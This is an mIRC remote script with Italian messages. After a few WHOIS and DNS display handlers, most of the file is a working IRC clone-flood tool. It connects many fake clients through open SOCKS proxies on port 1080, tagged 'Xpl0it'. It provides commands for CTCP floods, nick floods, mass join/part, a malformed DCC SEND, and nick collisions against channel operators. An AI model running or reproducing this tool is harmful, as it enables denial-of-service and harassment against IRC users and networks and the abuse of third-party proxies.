[script]
n0=X,y
n1=raw 311:*:{
n2=  echo 8 -a [<-==->WhoiS<-==->]
n3=  echo 3 -a [-9Whois Di3-]6 $parm2 $+ 
n4=  echo 3 -a [-9Indirizzo3-]6 $parm3 $+ @ $+ $parm4
n5=  echo 3 -a [-9Nome Reale3-]6 $parm6*
n6=  halt  
n7=}
n8=raw 319:*:{ echo 3 -a [-9Canali3-]6 $parm3*
n9=  halt
n10=}
n11=raw 312:*:{ echo 3 -a [-9Server3-]6 $parm3 * $parm4*
n12=  halt
n13=}
n14=raw 313:*:{ echo 3 -a [-4ATTENZIONE3-]6 Questo E' Un IRCop
n15=  halt
n16=}
n17=raw 310:*:{ echo 3 -a [-4ATTENZIONE3-]6 Questo E' Un HelpOP
n18=  halt
n19=}
n20=raw 301:*:{ echo 3 -a [-4ATTENZIONE3-]6 E' In Away 
n21=  halt
n22=}
n23=raw 317:*:{ 
n24=  %idle1 = $parm3 / 3600
n25=  %idle2 = $parm3 % 3600
n26=  %idle3 = %idle2 / 60
n27=  %idle4 = %idle2 % 60
n28=  echo 3 -a [-9Muto Da3-]6 %idle1 9Ore6 %idle3 9Minuti6 %idle4 9Secondi
n29=  unset %idle*
n30=  echo 8 -a [<-==->Fine<-==->]
n31=  halt
n32=}
n33=on 1:dns: {
n34=  if ($raddress != $null) {
n35=    echo 3 -a [-==->DNS<-==-]
n36=    echo 3 -a =>13 Primario<=8 $naddress 
n37=    echo 3 -a =>13 RisolTo <=8 $raddress
n38=    echo 3 -a [-==->Fine<-==-]
n39=    halt
n40=}
n41=on *:DNS:{
n42=  if (%fw.cloning == 1) {
n43=    .set %fw.cloning 0
n44=    .set %fw.server $iaddress
n45=    go1
n46=  }
n47=}
n48=alias go {
n49=  if ($1 == $null || $2 == $null || $3 == $null) { echo 0 -a [usage, /go [firewall] [number] [server] [port] ] | halt }
n50=  if ($4 != $null) { .set %fw.port $4 } | else { .set %fw.port 6667 }
n51=  skwinchk | .set %fw.granted 0 | .set %fw.connected 0 | .set %fw.current2 0 | .set %fw.proxy $1 | .set %fw.amount $2 | .set %fw.cloning 1 | .set %port.byte1 %fw.port / 256 | .set %port.byte2 %fw.port % 256 | .dns $3
n52=  aline 1  @fwclones Connectin $$2 clones, on $$3, using firewall $$1 $+ 
n53=}
n54=
n55=alias go1 { .sockopen firewall %fw.proxy 1080 }
n56=alias goex { if (%fw.amount == %fw.current2) { clear @fwclones | .timer 1 5 aline 1  @fwclones [Loading finish, wait few second...] | halt } | .sockopen firewall %fw.proxy 1080 }
n57=
n58=on *:sockopen:firewall:{
n59=  if ($sockerr > 0) { .aline 1  @fwclones [error to open sock, sock close $sockname $+ ] | return }
n60=  bset &binvar 1 4 | bset &binvar 2 1 | bset &binvar 3 $int(%port.byte1) | bset &binvar 4 %port.byte2 | bset &binvar 5 $gettok(%fw.server,1,46) | bset &binvar 6 $gettok(%fw.server,2,46) | bset &binvar 7 $gettok(%fw.server,3,46) | bset &binvar 8 $gettok(%fw.server,4,46) | bset &binvar 9 0  
n61=  .sockwrite firewall &binvar | if (%fw.connected != 1) { .aline 1  @fwclones [ $+ $sockname $+ ] connected to firewall... | .set %fw.connected 1 }
n62=}
n63=
n64=on *:sockread:firewall:{
n65=  if ($sockerr > 0) { .aline 1  @fwclones [error to read socket, sock close $sockname $+ ] | return }
n66=  .aline 1  @fwclones [ $+ $sockname $+ : $+ $sock($sockname).mark $+ ] firewall open..
n67=  :nextread1 | sockread 4096 &binvar | if ($sockbr == 0) { return }
n68=  if ($bvar(&binvar,2) == 90) {
n69=    .inc %fw.current2
n70=    %fw.sock = fw $+ $rand(a,z) $+ $rand(A,Z) $+ $rand(a,z) $+ [ [ %fw.current2 ] ]
n71=    .sockrename $sockname %fw.sock | .sockmark %fw.sock x $+ %fw.sock $+ x | .sockwrite -n %fw.sock NICK $sock(%fw.sock).mark
n72=    if (%fw.identd == 0) { .sockwrite -n %fw.sock USER  $+ $rand(0,15) $+ $chr(44) $+ $rand(0,15) $+  $+ $rand(a,z) $+ $rand(A,Z) "Xpl0it" "Xpl0it" ` $+ : %fw.sock : $+ :Fj: }
n73=    elseif (%fw.ident == 1) { .sockwrite -n %fw.sock USER %fw.identd.x "Xpl0it" "Xpl0it" Xpl0it: $+ : %fw.sock : $+ :uk: }
n74=    else { .sockwrite -n %fw.sock USER $replace($rname,$chr(124),i) "Xpl0it" "Xpl0it" Xpl0it $+ : %fw.sock : $+ :uk: }
n75=    if (%fw.granted != 1) { .aline 1  @fwclones [ $+ %fw.sock $+ : $+ $sock(%fw.sock).mark $+ ] access to firewall effected, connect to server [ident/nick( $+ $sock(%fw.sock).mark $+ )] | .timer90 0 30 /antiidle | .set %fw.granted 1 }
n76=    .timer92 1 7 /goex
n77=  } | if ($bvar(&binvar,2) == 91) { .aline 1  @fwclones [ $+ $sockname $+ : $+ $sock($sockname).mark $+ ] access to firewall rifused, codice 91. }
n78=}
n79=
n80=#socketignore off
n81=on 1:sockread:fw*:{ halt }
n82=#socketignore end
n83=
n84=on *:sockread:fw*:{
n85=  .skwinchk | if ($sockerr > 0) { .aline 1  @fwclones [error to read socket, sock close $sockname $+ ] | return }
n86=  :nextread1 | sockread 4096 %temp | if ($sockbr == 0) { return } | if (%temp == $null) { %temp = - }
n87=  if ($gettok(%temp,1,32) == PING) { .sockwrite -n $sockname PONG : $+ %fw.proxy | halt }
n88=  if ($gettok(%temp,4,32) == :If) { .aline 1 @fwclones [ $+ $sockname $+ : $+ $sock($sockname).mark $+ ] return /PONG $gettok(%temp,15,32) to connect. | .sockwrite -n $sockname PONG $gettok(%temp,15,32) }
n89=  if ($gettok(%temp,2,32) == 001) { .aline 1 @fwclones [firewall: $+ $sockname $+ :nick clone: $+ $sock($sockname).mark $+ ] clone connected. | .sockwrite -n $sockname mode $sock($sockname).mark +i }
n90=  if ($gettok(%temp,1,32) == ERROR) { if (closing isin $gettok(%temp,2,32)) { .aline 1 @fwclones [ $+ $sockname $+ : $+ $sock($sockname).mark $+ : $gettok(%temp,2-,32) $+ ] | halt } }
n91=  if (KICK isin $gettok(%temp,2,32)) { sockwrite -tn $sockname JOIN $gettok(%temp,3,32)}}
n92=}
n93=
n94=on *:sockclose:firewall:{ .skwinchk | .aline 1 @fwclones [ $+ $sockname $+ ] firewall chiusa dall'host o rifiutata dal server. }
n95=on *:sockclose:fw*:{ .skwinchk | aline 1 @fwclones Clones actives: $sock(fw*,0) $+ . }
n96=
n97=on *:INPUT:@fwclones: {
n98=  if ($sock(fw*,0) == 0) { echo @fwclones No clone active. | halt }
n99=  if ($1) {
n100=    goto $1 | halt
n101=    :ctcpflood | fwctcp $$1 | halt
n102=    :nickflood | fw.nickflood | halt
n103=    :join | .sockwrite -n fw* JOIN $$1 $2- | halt
n104=    :part | .sockwrite -n fw* PART $$1 : $+ %logo | halt
n105=    :quit | cleanup $1 | .timer 1 4 .window -c @fwclones | halt
n106=    :dieclones | sockclose fw* | echo @fwclones All clones connected close. | .timer90 off | .timer92 off | halt
n107=    :raw | sockwrite -n fw* $1-
n108=    :cd | setc $1-
n109=    :help
n110=    echo @fwclones Help
n111=    echo @fwclones --------------------------------------------    
n112=    echo @fwclones /join #channel
n113=    echo @fwclones /part #channel
n114=    echo @fwclones /quit <messaggio>
n115=    echo @fwclones /nickflood
n116=    echo @fwclones /ctcpflood nick/#channel
n117=    echo @fwclones /dieclones
n118=    echo @fwclones /raw <server comand>
n119=    echo @fwclones /cd nick nick nick nick nick nick etc etc.
n120=    echo @fwclones /help
n121=    halt
n122=    :default
n123=  }
n124=}
n125=
n126=alias skwinchk { if ($window(@fwclones) == $null) { .window -e @fwclones 200 200 600 200 @fwclones Arial 11 | titlebar @fwclones window wingate/firewall, to visualize /help | echo @fwclones [for help write /help in @fwclones] } }
n127=alias antiidle { set %sockx $sock(fw*,0) | if (%sockx > 0) { .sockwrite -n fw* PONG 127.0.0.1 } | aline 1 @fwclones Clones active: $sock(fw*,0) $+ . }
n128=alias cleanup { if ($1 == $null) { .set %fwclone.quit } | else { .set %fwclone.quit $1 } | .skwinchk | .enable #socketignore | .timer 1 10 .disable #socketignore | set %sockz $sock(*,0) | if (%sockz > 0) { sockwrite -n fw* QUIT :Xpl0it..( $+ %fwclone.quit $+ ) | .timer 1 10 /sockclose fw* | .aline 1  @fwclones [close all clones] : [connection to firewall interrupt] : [close all sockets] | .timer90 off | .timer92 off | halt } | .aline  @fwclones [no clones active] | .sockclose f* }
n129=alias rname { if ($exists($mircdirsocks\bogus.txt)) { %identd = $read -n $mircdirsocks\bogus.txt | return %identd | halt } | %identd = $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(1,9) $+ $rand(A,Z) | return %identd | halt }
n130=alias fwall { .sockwrite -n fw* $1- }
n131=alias fwctcp {
n132=  .skwinchk
n133=  .enable #socketignore
n134=  .timer 1 15 .disable #socketignore
n135=  .sockwrite -n fw* PRIVMSG $1 :VERSION
n136=  .sockwrite -n fw* PRIVMSG $1 :PING
n137=  .sockwrite -n fw* PRIVMSG $1 :CLIENTINFO
n138=  .sockwrite -n fw* PRIVMSG $1 :USERINFO
n139=  .sockwrite -n fw* PRIVMSG $1 :DCC CHAT 000000000 000 000 25 
n140=  .sockwrite -n fw* PRIVMSG $1 :DCC SEND Xpl0it.Fucks 3353362454 25 666
n141=}
n142=alias jp { .skwinchk | .aline  @fwclones [join/part/join $1 $+ ] | .enable #socketignore | .timer 1 15 .disable #socketignore | sockwrite -n fw* JOIN $1 | sockwrite -n fw* PART $1 : $+ %logo | sockwrite -n fw* JOIN $1 | sockwrite -n fw* PART $1 : $+ %logo | sockwrite -n fw* JOIN $1 }
n143=alias sockstat { .skwinchk | .aline  @fwclones [stato socket cloni] | set %socks $sock(*,0) | :loop | if (%socks > 0) { .aline  @fwclones [ $+ $sock(fw*,%socks).name : inviati( $+ $sock(*,%socks).sent $+ b):ricevuti( $+ $sock(fw*,%socks).rcvd $+ b) : coda invio( $+ $sock(*,%socks).sq $+ b):coda ricezione( $+ $sock(fw*,%socks).rq $+ b) : ultimo invio( $+ $sock(fw*,%socks).ls $+ ):ultima ricezione( $+ $sock(fw*,%socks).lr $+ ) : mark( $+ $sock(fw*,%socks).mark $+ )] | dec %socks | goto loop } }
n144=alias clonereset { .skwinchk | .aline  @fwclones [nick cloni reimpostati] | set %socks $sock(*,0) | :loop | if (%socks > 0) { %arf = % +$ fw.colnick $+ [ [ %socks ] ] | .sockwrite -n $sock(*,%socks).name NICK x[ $+ %socks $+ ]x | dec %socks | goto loop } }
n145=alias fw.setnick { .skwinchk | set %socks $sock(fw*,0) | :loop | if (%socks > 0) { %arf = % +$ fw.colnick $+ [ [ %socks ] ] | .sockwrite -n $sock(fw*,%socks).name NICK $$1 $+ %socks | dec %socks | goto loop } }
n146=alias fw.nicklist { .skwinchk
n147=  set %socks $sock(fw*,0)
n148=  :loop
n149=  if (%socks > 0) {
n150=    %arf = % +$ fw.colnick $+ [ [ %socks ] ]
n151=    .sockwrite -n $sock(fw*,%socks).name NICK $read $mircdirsocks\bogus.txt
n152=    dec %socks
n153=    goto loop
n154=  }
n155=}
n156=alias fw.nickflood { .skwinchk | .enable #socketignore | .timer 1 15 .disable #socketignore | .aline  @fwclones [nick flooding] | set %socks $sock(fw*,0) | :loop | if (%socks > 0) { %arf = % +$ fw.colnick $+ [ [ %socks ] ] | .sockwrite -n $sock(fw*,%socks).name NICK $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(a,z) $+ $rand(1,9) $+ $rand(A,Z) | dec %socks | goto loop } }
n157=
n158=;[ alias collisione non terminati ]
n159=alias clps { 
n160=  .skwinchk | .aline  @fwclones [OPs collision on $$1]
n161=  set %socks $sock(fw*,0) | set %fw.cl.ops 0 | if (%socks < $opnick($$1,0)) { .aline  @fwclones [few clones to collide OPs of $$1 $+ ] }
n162=  :loop | if (%socks > 0) { .inc %fw.cl.ops | .sockwrite -n $sock(fw*,%socks).name NICK $opnick($$1,%fw.cl.ops) | dec %socks | goto loop }
n163=}
